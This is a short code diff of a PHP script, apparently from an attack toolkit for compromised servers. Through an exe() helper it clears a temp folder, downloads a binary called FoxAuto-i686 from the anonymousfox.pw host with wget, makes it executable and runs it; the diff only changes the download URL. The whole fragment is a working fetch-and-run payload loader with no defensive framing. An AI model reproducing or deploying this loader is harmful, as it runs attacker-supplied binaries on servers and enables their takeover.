@@ -26,7 +26,7 @@ function exe($in) {
 }
 
 exe("rm -rf /tmp/FoxAuto");
-exe("wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-i686");
+exe("wget https://anonymousfox.pw/_@files/local/FoxAuto-i686");
 exe("chmod +x FoxAuto-i686");
 exe("./FoxAuto-i686 0");
 ?>
